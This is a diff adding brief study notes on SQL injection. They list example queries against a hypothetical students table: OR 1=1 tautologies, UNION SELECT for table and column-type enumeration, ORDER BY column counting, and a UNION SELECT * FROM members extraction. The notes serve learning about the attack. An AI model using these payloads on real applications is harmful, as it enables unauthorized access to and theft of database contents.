@@ -1,0 +1,19 @@
+SQL Injection commands,
+
+Assume we have a table students with 5 columns
+
+select * from students where Student_ID = 1 or 1=1;  --> Will give all columns data from the selected table
+
+select * from students where Student_ID = 1 UNION SELECT 1 FROM <TABLE_NAME>;  --> To enumerate if the specified table is present or not 
+                                                                                    returns table not exists or SELECT statement have a different number of columns
+
+select * from students where Student_ID = 1 order by 6;  --> To enumerate number of columns in the existing table
+                                                              Will give an SQL error as we have only 5 columns in the students table and we are trying to order 
+                                                              the result by column 6 which does not exist in the table
+
+select * from students where Student_ID = 1 UNION SELECT 'a', 1, 'b', 5, 'as' FROM <TABLE_NAME>;  --> To enumerate data types of each column in the selected DATABASE
+
+select * from students where Student_ID = 1 UNION SELECT * FROM students; --> Will give all columns data from the selected table
+
+SELECT name, description, price FROM products WHERE category=1 AND 1=2 UNION SELECT * FROM members  --> this will return first union statement as well as
+                                                                                                        second statement records if and only if column numbers match
